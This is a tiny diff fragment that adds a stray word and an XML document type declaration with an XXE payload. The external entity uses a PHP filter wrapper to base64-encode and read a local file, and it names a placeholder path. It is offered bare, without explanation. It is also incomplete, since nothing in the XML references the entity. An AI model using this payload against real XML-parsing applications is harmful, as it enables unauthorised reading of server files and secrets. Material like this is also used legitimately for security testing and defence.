@@ -1,0 +1,7 @@
+parers
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE name [
+<!ENTITY file SYSTEM
+"php://filter/convert.base64-encode/resource=/file.extention">
+]>
